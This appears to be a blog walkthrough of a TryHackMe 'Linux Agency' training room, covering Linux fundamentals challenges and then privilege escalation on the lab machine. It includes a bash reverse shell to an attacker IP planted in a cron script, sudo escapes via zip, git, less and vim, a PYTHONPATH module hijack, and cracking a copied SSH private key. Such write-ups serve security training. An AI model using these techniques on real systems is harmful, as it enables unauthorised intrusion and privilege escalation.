---
title: "Linux Agency TryHackme Writeup ef9cf80d221a"
platform: Medium
original_file: 2024-09-05_Linux-Agency-TryHackme-Writeup-ef9cf80d221a.md
---

# Linux Agency TryHackme Writeup ef9cf80d221a

::: {}
# Linux Agency TryHackme Writeup {#linux-agency-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
https://tryhackme.com/room/linuxagency
:::

::::::: {.section .e-content field="body"}
:::::: {#222c .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Linux Agency TryHackme Writeup {#f035 .graf .graf--h3 .graf--leading .graf--title name="f035"}

<figure id="e3f3" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*cNAR7guqhNRZAyIx.png"
class="graf-image" data-image-id="0*cNAR7guqhNRZAyIx.png"
data-width="553" data-height="313" />
</figure>

[https://tryhackme.com/room/linuxagency](https://tryhackme.com/room/linuxagency){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/linuxagency"
rel="noopener ugc nofollow noopener" target="_blank"}

Welcome to Linux Agency. Agent 47, this is where you will need to go
through several tests concerning linux fundamentals and privilege
escalation techniques.

This room is proudly made by
[**0z09e**](https://twitter.com/0z09e){.markup--anchor .markup--p-anchor
data-href="https://twitter.com/0z09e"
rel="noopener ugc nofollow noopener" target="_blank"} and
[**Xyan1d3**](https://twitter.com/xyan1d3){.markup--anchor
.markup--p-anchor data-href="https://twitter.com/xyan1d3"
rel="noopener ugc nofollow noopener" target="_blank"}

If you enjoy this room, please let us know by tagging us on Twitter. You
may also contact us in case of some unintended routes or bugs, and we
will be happy to resolve them.

Please wait about 1 minute before SSH'ing into the box.

SSH Username : **agent47**

SSH Password : **640509040147**

Each flag found will serve as the password for the next user. The flag
includes the username of the next user that is part of this challenge.
The Flag format is : `username{md5sum}`{.markup--code .markup--p-code}

The order of users: agent47 → mission1 → mission30 will be part of Task
3: Linux Fundamentals.

After those missions, the next levels will be in Task 4: Privilege
Escalation.

SSH into the box as agent47

``` {#3507 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
ssh agent47@10.10.188.218
```

Agent 47, we are ICA, the Linux Agency. We will test your Linux
Fundamentals. Let's see if you can pass all these challenges of basic
Linux. The password of the next mission will be the flag of that
mission. Example: `mission1{1234567890} `{.markup--code
.markup--p-code}will be the password for the mission1 user.

### Important Note:- {#f53a .graf .graf--h3 .graf-after--p name="f53a"}

### Find directory name {#afdc .graf .graf--h3 .graf-after--h3 name="afdc"}

``` {#f9bd .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
find / -type d -name "mission1" 2>/dev/null
```

### Find File name {#c1a9 .graf .graf--h3 .graf-after--pre name="c1a9"}

``` {#4a06 .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
find / -type f -name "mission1" 2>/dev/null
```

### Find Single word in whole system {#1245 .graf .graf--h3 .graf-after--pre name="1245"}

``` {#856d .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
grep -r "mission1" / 2>/dev/null
```

### Find word in hidden folder {#8110 .graf .graf--h3 .graf-after--pre name="8110"}

``` {#e12a .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
grep -r mission1 * .[^.]* 2>/dev/null
```

**Question 1**. What is the mission1 flag?

Let's go try every method here one by one

Now find a string "mission1" in hidden directory Example:- **.folder**

<figure id="47ec" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*PZjdUX7OdSb2qocO.png"
class="graf-image" data-image-id="0*PZjdUX7OdSb2qocO.png"
data-width="586" data-height="76" />
</figure>

So Now we Have

``` {#2c6a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="markdown"}
User => mission1
password => mission1{17********************f0}
```

<figure id="46a8" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*UyiPvsMmA6ZsxgEB.png"
class="graf-image" data-image-id="0*UyiPvsMmA6ZsxgEB.png"
data-width="429" data-height="82" />
</figure>

Now we turn into mission1 user. Lets find mission 2 flag

**Question 2**. What is the mission2 flag?

<figure id="4141" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6o7-eMGnqx4u8CZ-.png"
class="graf-image" data-image-id="0*6o7-eMGnqx4u8CZ-.png"
data-width="721" data-height="82" />
</figure>

So Now we Have

``` {#2ec4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="markdown"}
User => mission2
password => mission2{8a********************0d}
```

<figure id="35ee" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*g6yfuRsNUzXa5xvs.png"
class="graf-image" data-image-id="0*g6yfuRsNUzXa5xvs.png"
data-width="396" data-height="75" />
</figure>

Now we turn into mission2 user. Lets find mission 3 flag

**Question 3**. What is the mission3 flag?

<figure id="3c5b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Dj7bP9GZnN2ozsvb.png"
class="graf-image" data-image-id="0*Dj7bP9GZnN2ozsvb.png"
data-width="711" data-height="118" />
</figure>

So Now we Have

``` {#e16f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="markdown"}
User => mission2
password => mission3{ab********************76}
```

<figure id="609c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*r22JBAPsBdTvgmPy.png"
class="graf-image" data-image-id="0*r22JBAPsBdTvgmPy.png"
data-width="392" data-height="82" />
</figure>

Now we turn into mission3 user. Lets find mission 4flag

**Question 3**. What is the mission4 flag?

<figure id="92e4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*g6OKL2PMt1etGKds.png"
class="graf-image" data-image-id="0*g6OKL2PMt1etGKds.png"
data-width="584" data-height="134" />
</figure>

try nano flag.txt

<figure id="c131" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IjIOQ_JHvCaB7wcI.png"
class="graf-image" data-image-id="0*IjIOQ_JHvCaB7wcI.png"
data-width="608" data-height="192" />
</figure>

**Question 4.** what is mission5 flag

<figure id="9e01" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*NxFikqDlk1UMIgFt.png"
class="graf-image" data-image-id="0*NxFikqDlk1UMIgFt.png"
data-width="755" data-height="75" />
</figure>

**Question 5.** what is mission6 flag

<figure id="d132" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JBq_xdAhnH7UOMxs.png"
class="graf-image" data-image-id="0*JBq_xdAhnH7UOMxs.png"
data-width="768" data-height="77" />
</figure>

**Question 6.** what is mission7 flag

<figure id="6d8c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*F_yIqN2fREEYlWcB.png"
class="graf-image" data-image-id="0*F_yIqN2fREEYlWcB.png"
data-width="755" data-height="85" />
</figure>

**Question 7.** what is mission8 flag

<figure id="46e8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*k1xQ9eix-k4odLI-.png"
class="graf-image" data-image-id="0*k1xQ9eix-k4odLI-.png"
data-width="759" data-height="75" />
</figure>

**Question 8.** what is mission9 flag

<figure id="4c2e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*h3Onp4iM7OV6iSoX.png"
class="graf-image" data-image-id="0*h3Onp4iM7OV6iSoX.png"
data-width="682" data-height="175" />
</figure>

**Question 9.** what is mission10 flag

<figure id="5555" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8Yt7JV-2p17ALV-W.png"
class="graf-image" data-image-id="0*8Yt7JV-2p17ALV-W.png"
data-width="728" data-height="162" />
</figure>

**Question 10.** what is mission11 flag

<figure id="8e30" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*RdfXcPSpWlm_BKL0.png"
class="graf-image" data-image-id="0*RdfXcPSpWlm_BKL0.png"
data-width="875" data-height="71" />
</figure>

**Question 11.** what is mission12 flag

Hint says EVS that menas Environment system

<figure id="f611" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dCDbDfPO9I_a0cYx.png"
class="graf-image" data-image-id="0*dCDbDfPO9I_a0cYx.png"
data-width="509" data-height="96" />
</figure>

**Question 12.** what is mission13 flag

<figure id="ce5c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WbP7EXq-g_PsH2_R.png"
class="graf-image" data-image-id="0*WbP7EXq-g_PsH2_R.png"
data-width="790" data-height="198" />
</figure>

**Question 13.** what is mission14 flag

<figure id="d794" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uCsU9SdX12FtK_On.png"
class="graf-image" data-image-id="0*uCsU9SdX12FtK_On.png"
data-width="875" data-height="152" />
</figure>

**Question 14.** what is mission15 flag

<figure id="66be" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1mz2U1zHG3vmLfeO.png"
class="graf-image" data-image-id="0*1mz2U1zHG3vmLfeO.png"
data-width="875" data-height="151" />
</figure>

<figure id="5f83" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*cZHbfoueb2RNB3Ry.png"
class="graf-image" data-image-id="0*cZHbfoueb2RNB3Ry.png"
data-width="751" data-height="390" />
</figure>

[https://www.convertbinary.com/to-text/](https://www.convertbinary.com/to-text/){.markup--anchor
.markup--p-anchor data-href="https://www.convertbinary.com/to-text/"
rel="noopener ugc nofollow noopener" target="_blank"}

**Question 15.** what is mission16 flag

Hex to Text convert

<figure id="8ed4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WguVL-FsUCzmwPxb.png"
class="graf-image" data-image-id="0*WguVL-FsUCzmwPxb.png"
data-width="849" data-height="209" />
</figure>

**Question 16.** what is mission17 flag

<figure id="4f88" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*QwmI6fRQsgm0Z6nW.png"
class="graf-image" data-image-id="0*QwmI6fRQsgm0Z6nW.png"
data-width="830" data-height="289" />
</figure>

its look like binary file because of ELF word in file

<figure id="7faa" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*sgXBw43I5Xm2bRdK.png"
class="graf-image" data-image-id="0*sgXBw43I5Xm2bRdK.png"
data-width="736" data-height="224" />
</figure>

**Question 17.** what is mission18 flag

<figure id="1409" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*q1GYygc-bCawBJDG.png"
class="graf-image" data-image-id="0*q1GYygc-bCawBJDG.png"
data-width="829" data-height="396" />
</figure>

So its Java file

<figure id="45fe" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FJEXcUX2_glR2hbv.png"
class="graf-image" data-image-id="0*FJEXcUX2_glR2hbv.png"
data-width="485" data-height="139" />
</figure>

**Question 18.** what is mission19 flag

<figure id="c4a0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*VUe6WwJvQaAiQ1H3.png"
class="graf-image" data-image-id="0*VUe6WwJvQaAiQ1H3.png"
data-width="469" data-height="134" />
</figure>

**Question 19.** what is mission20 flag

<figure id="d2b7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MsLqLPvMtUjNQ_xc.png"
class="graf-image" data-image-id="0*MsLqLPvMtUjNQ_xc.png"
data-width="510" data-height="361" />
</figure>

**Question 20.** what is mission21 flag

<figure id="dca9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JHw5S-_h7_Auig62.png"
class="graf-image" data-image-id="0*JHw5S-_h7_Auig62.png"
data-width="730" data-height="236" />
</figure>

In the deploy machine there is no python tool so copied the code and run
on own kali linux , and then run program

``` {#0e73 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python"}
flag = ">:  :<=ab(d76dfe2210fak1gge5e61`kgbj`bk5c0."
for i in range(len(flag)):
    flag = (flag[:i] + chr(ord(flag[i]) ^ ord("S")) +flag[i + 1:]);
    print(flag[i], end = "");
print()
```

<figure id="6dc6" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*K2zpfkHbXbTG95t2.png"
class="graf-image" data-image-id="0*K2zpfkHbXbTG95t2.png"
data-width="459" data-height="85" />
</figure>

**Question 21.** what is mission22 flag

Get TTY Shell

``` {#5653 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/null
```

<figure id="02e1" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*6FQumfxQIqezSAwe.png"
class="graf-image" data-image-id="0*6FQumfxQIqezSAwe.png"
data-width="493" data-height="112" />
</figure>

**Question 22.** what is mission23 flag

<figure id="a785" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*BwV5Lfq27CGmlB5w.png"
class="graf-image" data-image-id="0*BwV5Lfq27CGmlB5w.png"
data-width="719" data-height="272" />
</figure>

**Question 23.** what is mission24 flag

<figure id="581d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*sVW2Ksg2NMiYvMOf.png"
class="graf-image" data-image-id="0*sVW2Ksg2NMiYvMOf.png"
data-width="843" data-height="114" />
</figure>

**Question 24.** what is mission25 flag

<figure id="393d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tQwcHTA36D6zdSbZ.png"
class="graf-image" data-image-id="0*tQwcHTA36D6zdSbZ.png"
data-width="843" data-height="149" />
</figure>

**Question 25.** what is mission26 flag

<figure id="81df" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*oLc-Kl-6lAxyYL3Y.png"
class="graf-image" data-image-id="0*oLc-Kl-6lAxyYL3Y.png"
data-width="482" data-height="175" />
</figure>

``` {#e5a4 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
su mission26
exit
su mission26
```

**Question 26.** what is mission27 flag

<figure id="3cc1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GSJSA-ZvWW51lRa8.png"
class="graf-image" data-image-id="0*GSJSA-ZvWW51lRa8.png"
data-width="845" data-height="206" />
</figure>

**Question 27.** what is mission28 flag

<figure id="1aed" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9Zf59W4rfA5YgVLT.png"
class="graf-image" data-image-id="0*9Zf59W4rfA5YgVLT.png"
data-width="735" data-height="194" />
</figure>

**Question 28.** what is mission29 flag

<figure id="ab26" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ztLutnAyNB39COrT.png"
class="graf-image" data-image-id="0*ztLutnAyNB39COrT.png"
data-width="541" data-height="208" />
</figure>

**Question 29.** what is mission30 flag

<figure id="1477" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Bq0-dmF7NVGa9jNH.png"
class="graf-image" data-image-id="0*Bq0-dmF7NVGa9jNH.png"
data-width="749" data-height="137" />
</figure>

**What is viktor's Flag?**

<figure id="c0f3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bohO2LYS1BzdmQqP.png"
class="graf-image" data-image-id="0*bohO2LYS1BzdmQqP.png"
data-width="843" data-height="240" />
</figure>

### Task 4. Privilege Escalation {#751b .graf .graf--h3 .graf-after--figure name="751b"}

**What is dalia's flag?**

Let's find suspicious file in system. when we review **/etc/crontabs,**
something looks like interesting:

<figure id="fdae" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*RsCJGAJXqQw9JHrX.png"
class="graf-image" data-image-id="0*RsCJGAJXqQw9JHrX.png"
data-width="825" data-height="484" />
</figure>

Now Check this script, and also we have permission to execute this
script and **cronjob** per minute. One more thing, **47.sh** script is
same with the output of the decode of the **base64** decode.

<figure id="5389" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZvBsZLRcLbjg5BVp.png"
class="graf-image" data-image-id="0*ZvBsZLRcLbjg5BVp.png"
data-width="600" data-height="345" />
</figure>

Let's add our reverse shell here

Now start netcat listener

``` {#ffa6 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
#!/bin/bash
bash -i >& /dev/tcp/10.2.12.26/4444 0>&1
```

<figure id="2619" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*H016cDJMWWakc1Eb.png"
class="graf-image" data-image-id="0*H016cDJMWWakc1Eb.png"
data-width="874" data-height="139" />
</figure>

you have only 30 seconds to add shell and get reverse shell otherwise
your 47.sh file will be reset and you need add shell again

<figure id="cfa0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IH58NqbuZTpJQd8P.png"
class="graf-image" data-image-id="0*IH58NqbuZTpJQd8P.png"
data-width="875" data-height="156" />
</figure>

BOOM ! we got shell

<figure id="aa3e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6s85VruNJkgictWp.png"
class="graf-image" data-image-id="0*6s85VruNJkgictWp.png"
data-width="447" data-height="305" />
</figure>

### tty shell {#91c4 .graf .graf--h3 .graf-after--figure name="91c4"}

But its not proper interactive shell . To get tty shell we do this kind
of things

- [**The first thing**: to do is use **script -qc /bin/bash /dev/null**,
  which uses Python to spawn a better-featured bash shell. At this
  point, our shell will look a bit prettier, but we still won't be able
  to use tab autocomplete or the **arrow keys**, and **Ctrl + C** will
  still kill the shell.]{#17ba}

**-Step two is**: **export TERM=xterm** --- this will give us access to
term commands such as clear.

**-Finally** **(and most importantly)** we will background the shell
using **Ctrl + Z**. Back in our own terminal we use **stty raw -echo;
fg**. This does two things: first, it turns off our own terminal echo
(which gives us access to **tab autocompletes**, **the arrow keys**, and
**Ctrl + C** to kill processes). It then foregrounds the shell, thus
completing the process.\
-**Note** **that if the shell dies**, any input in your own terminal
will not be visible (as a result of having disabled terminal echo). **To
fix this**, type **reset** and press enter.

<figure id="0787" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1jbGvJ0pmFxj7RQW.png"
class="graf-image" data-image-id="0*1jbGvJ0pmFxj7RQW.png"
data-width="560" data-height="173" />
</figure>

**What is silvio's flag?**

We have sudo rights

<figure id="4a29" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uTaV9q6LojHEhTSF.png"
class="graf-image" data-image-id="0*uTaV9q6LojHEhTSF.png"
data-width="609" data-height="487" />
</figure>

**Run as** **silvio** with **sudo**, you'll gain **silvio**:

[GTFObins](https://gtfobins.github.io/gtfobins/zip/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/zip/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="d01e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yZdEM9LY_UtiVHsu.png"
class="graf-image" data-image-id="0*yZdEM9LY_UtiVHsu.png"
data-width="849" data-height="278" />
</figure>

``` {#478b .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
TF=$(mktemp -u)
sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
```

<figure id="8821" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*oRnIXurPdwLIRcZz.png"
class="graf-image" data-image-id="0*oRnIXurPdwLIRcZz.png"
data-width="727" data-height="271" />
</figure>

<figure id="4a04" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*T1QQXVdBjlbxgplT.png"
class="graf-image" data-image-id="0*T1QQXVdBjlbxgplT.png"
data-width="490" data-height="240" />
</figure>

**What is reza's flag?**

We have sudo rights again for another command

<figure id="e12f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*J3TAoX45mhFH1MEf.png"
class="graf-image" data-image-id="0*J3TAoX45mhFH1MEf.png"
data-width="625" data-height="484" />
</figure>

[GTFObins](https://gtfobins.github.io/gtfobins/git/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/git/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="499e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*daLk6oO3GrjPQopx.png"
class="graf-image" data-image-id="0*daLk6oO3GrjPQopx.png"
data-width="833" data-height="156" />
</figure>

``` {#7f26 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<figure id="2f31" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*zZ6i5XUaNZqw6QZ-.png"
class="graf-image" data-image-id="0*zZ6i5XUaNZqw6QZ-.png"
data-width="825" data-height="481" />
</figure>

**What is jordan's flag?**

When review the **sudo** rights, we see **/opt/scripts/Gun-Shop.py**
script. If we execute it, we get a message which there is no **shop**
module in the below:

<figure id="e992" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Kx3hHKe7LVm6SMo2.png"
class="graf-image" data-image-id="0*Kx3hHKe7LVm6SMo2.png"
data-width="741" data-height="568" />
</figure>

But we can add this module to a directory like **/tmp** which each user
and services access:

<figure id="b3fc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*EjRcsT7LDfG5Jy5L.png"
class="graf-image" data-image-id="0*EjRcsT7LDfG5Jy5L.png"
data-width="711" data-height="335" />
</figure>

You can do whatever you want. You can try to get a revershell or
bindshell. Hereby the most significant point is the right which
**/opt/scripts/Gun-Shop.py** script runs with jordan permission:

Run as jordan with sudo /opt/scripts/Gun-Shop.py: **sudo -u jordan
PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py**

<figure id="f3e5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2pGLXJ8LDgKIas7o.png"
class="graf-image" data-image-id="0*2pGLXJ8LDgKIas7o.png"
data-width="875" data-height="425" />
</figure>

**What is ken's flag?**

Check sudo rights:
[https://gtfobins.github.io/gtfobins/less/#sudo](https://gtfobins.github.io/gtfobins/less/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/less/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="e417" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*b2TFsVi4cjkUQHZT.png"
class="graf-image" data-image-id="0*b2TFsVi4cjkUQHZT.png"
data-width="615" data-height="479" />
</figure>

<figure id="7b1a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*9GLBhvJSsfVLhcCr.png"
class="graf-image" data-image-id="0*9GLBhvJSsfVLhcCr.png"
data-width="849" data-height="182" />
</figure>

Run as **ken**: **sudo -u ken less /etc/profile**

<figure id="8cdd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*qU9Q47e7zJsuUo8Q.png"
class="graf-image" data-image-id="0*qU9Q47e7zJsuUo8Q.png"
data-width="740" data-height="521" />
</figure>

Add **!/bin/sh** to the page which popped up.

<figure id="1942" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hdCJSxVAKqMVDaWd.png"
class="graf-image" data-image-id="0*hdCJSxVAKqMVDaWd.png"
data-width="675" data-height="358" />
</figure>

**What is sean's flag?**

Check the **sudo** rights one more time:
[https://gtfobins.github.io/gtfobins/vim/#sudo](https://gtfobins.github.io/gtfobins/vim/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/vim/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"} -\> (a)

<figure id="7cd8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*i5SJR3mCWGI-S5Lv.png"
class="graf-image" data-image-id="0*i5SJR3mCWGI-S5Lv.png"
data-width="568" data-height="491" />
</figure>

Run as **sean**: **sudo -u sean vim -c ':!/bin/sh'**

``` {#9416 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
script -qc /bin/bash /dev/null
```

<figure id="4c5c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*XERHs8EJrJSDOMNE.png"
class="graf-image" data-image-id="0*XERHs8EJrJSDOMNE.png"
data-width="875" data-height="317" />
</figure>

<figure id="7af6" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*DvOxQYO2X3PDmYOR.png"
class="graf-image" data-image-id="0*DvOxQYO2X3PDmYOR.png"
data-width="780" data-height="95" />
</figure>

**What is penelope's flag?**

<figure id="2c2f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8yAD1Juf8yDjH2VI.png"
class="graf-image" data-image-id="0*8yAD1Juf8yDjH2VI.png"
data-width="485" data-height="183" />
</figure>

**What is maya's flag?**

the owner of **base64** file is maya

<figure id="834e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*NROmEEg_HknSZJD4.png"
class="graf-image" data-image-id="0*NROmEEg_HknSZJD4.png"
data-width="797" data-height="297" />
</figure>

Check it on [gtfobins](https://gtfobins.github.io/){.markup--anchor
.markup--p-anchor data-href="https://gtfobins.github.io/"
rel="noopener ugc nofollow noopener" target="_blank"}:
[https://gtfobins.github.io/gtfobins/base64/#sudo](https://gtfobins.github.io/gtfobins/base64/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/base64/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="3a72" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hv1uBlpm0LvQ9WyW.png"
class="graf-image" data-image-id="0*hv1uBlpm0LvQ9WyW.png"
data-width="803" data-height="466" />
</figure>

**What is robert's Passphrase?**

Check **old_robert_ssh** directory:

<figure id="2b23" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*QS8RpJql0SjHRQVb.png"
class="graf-image" data-image-id="0*QS8RpJql0SjHRQVb.png"
data-width="688" data-height="337" />
</figure>

Copy **id_rsa** with **scp** on your local machine, convert **id_rsa**
into hash using **/usr/share/john/ssh2john** and finally crack it with
**john** like in the below

<figure id="51ff" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Gd-b9MVdChRzdj2M.png"
class="graf-image" data-image-id="0*Gd-b9MVdChRzdj2M.png"
data-width="875" data-height="203" />
</figure>

<figure id="7a83" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*FBcvODZXwfS0cKb3.png"
class="graf-image" data-image-id="0*FBcvODZXwfS0cKb3.png"
data-width="729" data-height="464" />
</figure>

**What is user.txt?**

Use **ss** of network tool to monitorize ports on victim machine: **ss
-tulpn**

<figure id="fc92" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TR6Lo5U3Arj17wjG.png"
class="graf-image" data-image-id="0*TR6Lo5U3Arj17wjG.png"
data-width="875" data-height="357" />
</figure>

Number of port **2222** looks like handful:

<figure id="f467" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*iygq_6GMzi4lBP1b.png"
class="graf-image" data-image-id="0*iygq_6GMzi4lBP1b.png"
data-width="795" data-height="299" />
</figure>

<figure id="0ca5" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*JXqVPQTzOFW4Q2Ld.png"
class="graf-image" data-image-id="0*JXqVPQTzOFW4Q2Ld.png"
data-width="650" data-height="617" />
</figure>

**Sudo Security Bypass room**

([https://tryhackme.com/room/sudovulnsbypass](https://tryhackme.com/room/sudovulnsbypass){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/sudovulnsbypass"
rel="noopener ugc nofollow noopener" target="_blank"}) for Sudo Security
Bypass on exploit-db
([https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com/exploits/47502"
rel="noopener ugc nofollow noopener" target="_blank"}) and also you can
check here:
[https://gtfobins.github.io/gtfobins/bash/#sudo](https://gtfobins.github.io/gtfobins/bash/#sudo){.markup--anchor
.markup--p-anchor
data-href="https://gtfobins.github.io/gtfobins/bash/#sudo"
rel="noopener ugc nofollow noopener" target="_blank"}.

**Now we are root with privileges**:

<figure id="0123" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*cyK_7B14vkduUtkW.png"
class="graf-image" data-image-id="0*cyK_7B14vkduUtkW.png"
